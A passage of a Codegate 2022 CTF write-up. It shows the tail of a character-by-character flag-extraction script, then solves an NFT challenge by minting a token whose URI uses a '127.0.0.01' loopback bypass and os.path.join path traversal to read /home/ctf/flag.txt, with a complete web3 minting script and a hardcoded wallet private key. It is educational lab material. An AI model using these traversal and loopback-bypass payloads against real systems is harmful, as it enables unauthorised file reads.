        burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        good = 'ahadfgsdaf' in r.text
        if good:
            flag += c
            print(flag)
            break
    print('done')
```

The flag is `codegate2022{bcbbc8d6c8f7ea1924ee108f38cc000f}`

<a name="nft"></a>
# nft (Blockchain)


Description:

```
NFT should work as having a deeply interaction with third-party like https://opensea.io/

We all know that blockchain is opened to all, which give us some guaranty thus it will work as we expected, however can we trust all this things?

contract: 0x4e2daa29B440EdA4c044b3422B990C718DF7391c

service: http://13.124.97.208:1234

rpc: http://13.124.97.208:8545/

faucet: http://13.124.97.208:8080

network info: mainnet, petersburg
```

Blockchain + web challenge. The actual vulnerability is web-related, but exploiting the vulnerability is done through minting a NFT that has a specific URI.
The vulnerability can be found in views.py:
```py
def get_response(uri):
    if uri.startswith('http://') or uri.startswith('https://'):
        validator = URLValidator()
        result = requests.get(uri, timeout=3)
        try:
            validator(uri)
            result = requests.get(uri, timeout=3)
        except:
            return

        return result.text

    elif any([uri.startswith(str(i)) for i in range(1, 10)]) and uri.find('/') != -1:
        ip = uri.split('/')[0]

        if uri.find('..') != -1 or not uri.startswith(os.path.join(ip, nft_path + '/')):
            return

        try:
            validate_ipv4_address(ip)
        except:
            return

        ipv4 = ipaddress.IPv4Address(ip)
        if str(ipv4) not in ['127.0.0.1', '0.0.0.0']:
            return

        nft_file = uri.split(nft_path + '/')[-1]
        if nft_file.find('.') != -1 and nft_file.split('.')[-1]:
            path = os.path.join(os.getcwd(), nft_path, nft_file)

            with open(path, 'rb') as f:
                return f.read()

        return
```
For every NFT the function is called on its tokenURI. We can notice that for http[s?]:// it behaves as expected. For unknown URI it must start with an IP that resolves to `127.0.0.1` or `0.0.0.0`
The line
```py
ipaddress.IPv4Address(ip)
```
Allows us to insert IPs like `127.0.0.01` and they will be resolved to `127.0.0.1`, and in some django versions validate_ipv4_address is just an alias for `ipaddress.IPv4Address`
The vulnerable line is 
```py
path = os.path.join(os.getcwd(), nft_path, nft_file)
```
os.path.join is a bit broken in python, if the last value starts with '/' then it overrides the whole path and it is treated as an absolute path.
This payload bypasses the paths and reads the flag:
```
127.0.0.01/account/storages//home/ctf/flag.txt
```
The Blockchain part
In order to get a wallet we must register and then login on the web platform, that can be done using the /regist and /login paths. We will get the private and public keys.
To get the contract ABI we must compile the smart contract (nft.sol):
```
$ solcjs nft.sol --abi
```
We must modify it a bit in order to compile:
```js
pragma solidity 0.8.11;


import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Counters.sol";

contract PrivateNFT is ERC721, Ownable {
    using Counters for Counters.Counter;
    Counters.Counter private _tokenIds;

    using Strings for uint256;
    mapping(uint256 => string) private _tokenURIs;
    mapping(address => uint256[]) private _tokenIDs;

    constructor() ERC721("CodeGate", "CDG") {}

    function getTokenURI(uint256 tokenId) public view returns (string memory) {
        require(_exists(tokenId));
        require(ownerOf(tokenId) == msg.sender);

        string memory _tokenURI = _tokenURIs[tokenId];
        string memory base = _baseURI();

        if (bytes(base).length == 0) {
            return _tokenURI;
        }
        if (bytes(_tokenURI).length > 0) {
            return string(abi.encodePacked(base, _tokenURI));
        }

        return super.tokenURI(tokenId);
    }

    function getIDs() public view returns (uint256[] memory) {
        return _tokenIDs[msg.sender];
    }

    function _setTokenURI(uint256 tokenId, string memory _tokenURI) internal {
        require(_exists(tokenId));
        _tokenURIs[tokenId] = _tokenURI;
    }

    modifier contains (string memory what, string memory where) {
        bytes memory whatBytes = bytes (what);
        bytes memory whereBytes = bytes (where);

        require(whereBytes.length >= whatBytes.length);

        bool found = false;
        for (uint i = 0; i <= whereBytes.length - whatBytes.length; i++) {
            bool flag = true;
            for (uint j = 0; j < whatBytes.length; j++)
                if (whereBytes [i + j] != whatBytes [j]) {
                    flag = false;
                    break;
                }
            if (flag) {
                found = true;
                break;
            }
        }
        require (!found);

        _;
    }

    function mintNft(string memory tokenURI) external contains ("127.0.0.1", tokenURI) contains ("0.0.0.0", tokenURI) returns (uint256) {
        require(balanceOf(msg.sender) <= 3);
        _tokenIds.increment();

        uint256 newNftTokenId = _tokenIds.current();
        _mint(msg.sender, newNftTokenId);
        _setTokenURI(newNftTokenId, tokenURI);
        _tokenIDs[msg.sender].push(newNftTokenId);
        return newNftTokenId;
    }
}
```

As we can see `mintNft` doesn't allow URIs that contain either `127.0.0.1` or `0.0.0.0`, but that is okay since we have the bypass in the django app.
Communicating with the blockchain is tricky since ctf-eth-env from chainflag was used, which disables some methods like `eth_getBlockByHash` and `eth_getBlockByNumber` which makes some scripts go bananas, in the end I used web3 from Python and was able to mint the NFT:

```py
import json
from web3 import Web3

def get_nonce(addr):
    return w3.eth.get_transaction_count(addr)

def get_transaction_body(addr):
    return {
        "nonce": get_nonce(addr),
        "gas": 1239137,
        "gasPrice": 21000000000,
        "value": 0,
        "from": addr,
        "chainId": w3.eth.chain_id
    }

def send_transaction(addr, func_name: str, *func_args):
    transaction_body = get_transaction_body(addr)
    function_call = contract.functions[func_name](*func_args).buildTransaction(transaction_body)
    signed_transaction = w3.eth.account.sign_transaction(function_call, private_key)
    result = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
    tx_hash = w3.eth.wait_for_transaction_receipt(result)
    return tx_hash

addr = '0x7d72a7a9E533478A265477E69052228e02f0E750'
private_key = '0x4a249016e8ac033de957a7b0ea02187515cbd5636e18071811e36811a2af7566'

contract_abi = json.loads('[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getIDs","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getTokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"string","name":"tokenURI","type":"string"}],"name":"mintNft","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]')
w3 = Web3(Web3.HTTPProvider("http://13.124.97.208:8545/"))
addr_contract = "0x4e2daa29B440EdA4c044b3422B990C718DF7391c"
contract = w3.eth.contract(address=addr_contract, abi=contract_abi)

send_transaction(addr, "mintNft", '127.0.0.01/account/storages//home/ctf/flag.txt')
```

We can then visit /user_id/nfts/ to view our newly minted NFT which contains the flag

`codegate2022{6045837849c1f07ff1be220ef1600f61b99dca10d5bcf648aa2f9d36ffbda96ef5a0feb28498eeba59430874583a0e42015a6ed879c34483cb968dcd12}`